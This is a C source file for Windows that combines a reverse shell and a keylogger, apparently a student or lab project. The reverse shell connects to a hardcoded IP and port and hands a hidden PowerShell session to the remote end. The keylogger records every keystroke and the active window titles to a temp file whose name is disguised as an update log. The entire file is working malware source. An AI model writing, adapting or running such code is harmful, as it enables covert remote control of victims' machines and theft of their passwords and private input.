#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <Winuser.h>
#include <stdbool.h>

#pragma comment (lib, "User32.lib")
#pragma comment (lib, "Ws2_32.lib")

#include "keymappings.h"


// Convert WideString to UTF-8
void utf8_encode(char* dst, const wchar_t* src, int dstSize) {
    if (dst == NULL || src == NULL) return;
    WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstSize, NULL, NULL);
}


int reverseShell();
int keyLogger();
//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
    int result = 1;
    printf("Tiếng Việt");
    /*
    Create a reverse shell to the attacker ip
    Keylogger
    */
    result = reverseShell();
    if (result != 0) {
        printf("\nCant init rev shell");
    }
    result = keyLogger();
    if (result != 0) {
        printf("\nCant init keylogger");
    }

    return 0;
}

int reverseShell() {
    const char* serverAddress = "192.168.8.128";
    const char* serverPort = "7676";
    /*
    Initiates use of winsock dll by using WSAStartup
    Create a socket for the client:
        + Declare an addrinfo object
        + Call getaddrinfo to get server info
        + Create SOCKET object
        + Call WSASocketW to create the client socket
    Connect to the server:
        + Call connect to connect to the server
    Spawn a reverse shell:
        + Create a cmd.exe process then writes input, output, error to the handle of the socket
    */

    WSADATA wsaData;
    //Initiates use of winsock dll
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup fail");
        return 1;
    }

    //Create a socket for the client
    addrinfo hints;
    addrinfo* results = NULL; //Pointer to linked list of addrinfo structs
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; //Use only ipv4
    hints.ai_socktype = SOCK_STREAM; //TCP
    hints.ai_protocol = IPPROTO_TCP;
    iResult = getaddrinfo(serverAddress, serverPort, &hints, &results);
    if (iResult != 0) {
        printf("getaddrinfo fail");
        WSACleanup();
        return 1;
    }
    SOCKET connectSocket = INVALID_SOCKET;
    addrinfo* ptr = results; // pointer to the first addrinfo struct
    connectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);
    if (connectSocket == INVALID_SOCKET) {
        printf("Failed to create socket");
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    //Connect to the server
    iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("Cant connect to %s:%s", serverAddress, serverPort);
        closesocket(connectSocket);
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    //Spawn a reverse shell
    const wchar_t* shell = L"powershell.exe";
    wchar_t shellCmd[MAX_PATH];
    wcscpy_s(shellCmd, shell);

    STARTUPINFO startupInfo = { sizeof(startupInfo) };
    PROCESS_INFORMATION processInfo;
    HANDLE hSocket = (HANDLE)connectSocket; //Cast SOCKET value to HANDLE type
    startupInfo.dwFlags = STARTF_USESTDHANDLES; //CreateProcess will use provided handle
    startupInfo.hStdError = startupInfo.hStdInput = startupInfo.hStdOutput = hSocket; //Pipe the in, out, error to the socket
    iResult = CreateProcessW(
        0,
        shellCmd,
        0,
        0,
        TRUE, // Allow handle inheritance
        CREATE_NO_WINDOW,
        0,
        0,
        &startupInfo,
        &processInfo
    );
    if (iResult == 0) {
        send(connectSocket, "Cant create shell", 18, MSG_OOB);
        closesocket(connectSocket);
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    return 0;
}

//TODO: ADD TIME TRACKING, NUMLOCK CHARACTERS
int keyLogger() {
    /*
    * GetTempPath to get current user temp path
    * Create a txt file to store pressed key
    * Ceate a loop from 0 to 255:
        - In each loop use GetAsyncKeyState() to get the if the current key value is being pressed
        - If its true:
          + Get the current active windows GetForegroundWindow()
          + Check if current window the same to prev window, true:
            + Set the prevHandle to the currentHandle
            + Get the window name GetWindowTextW()
            + Write the window text into file
          + Check mapping of current value through custom func GetKeyName()
            + Write key to current line in file according to mappings 
    */

    int currentValue = 0;
    HWND prevhWnd = NULL;
    wchar_t windowTitle[256];
    wchar_t currentTitle[256] = { NULL };
    char tempPath[MAX_PATH];
    char keyLogPath[MAX_PATH];


    // Create file in temp folder
    int iResult = GetTempPathA(MAX_PATH, tempPath);
    if (iResult == 0) {
        printf("Cant get temp path");
        return 1;
    }
    strcpy_s(keyLogPath, tempPath);
    strcat_s(keyLogPath, "\\UpdatesLogs.txt");
    FILE* fPtr;
    iResult = fopen_s(&fPtr, keyLogPath, "a");
    if (iResult != 0) {
        printf("Failed to create file");
        return 1;
    }

    // Keylogger imple
    bool keyState[256] = { FALSE }; //To track if key is down or up
    while (true) {
        for (int i = 0x1; i <= 0xFE; i++) {
            // Because VK_RSHIFT, VK_LSHIFT both registered as VK_SHIFT so we skip these for better output
            if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) {
                continue;
            }
            bool isDown = (GetAsyncKeyState(i) < 0);
            // If keyState is FALSE (UP) and key just got pressed => write key. Else dont write
            if (isDown && !keyState[i]) {
                keyState[i] = TRUE;
                HWND currenthWnd = GetForegroundWindow();      
                prevhWnd = currenthWnd;
                int textLen = GetWindowTextW(currenthWnd, windowTitle, 256);
                // Check if the title is different
                if (textLen > 0 && (wcscmp(currentTitle, windowTitle) != 0)) {
                    wcscpy_s(currentTitle, windowTitle);
                    char utf8Title[1024];
                    utf8_encode(utf8Title, currentTitle, sizeof(utf8Title));
                    printf("\n==========[%s]==========\n", utf8Title);
                    fprintf(fPtr, "\n==============================[%s]==============================\n", utf8Title);
                }
                printf("%s", GetKeyName(i));
                fprintf(fPtr, "%s", GetKeyName(i));
            }
            // If key is not pressed but keyState is TRUE (DOWN) write key released 
            else if (!isDown && keyState[i]) {
                keyState[i] = FALSE;
                // For these buttons check if they are released
                if (getKeyType(i) == OTHERS_TYPE) {
                    printf("[%s Released]", GetKeyName(i));
                    fprintf(fPtr, "[%s Released]", GetKeyName(i));
                }
            }
        }
        Sleep(20);
    }
}

// test 123123123 Nguyen Duc Hoang Nam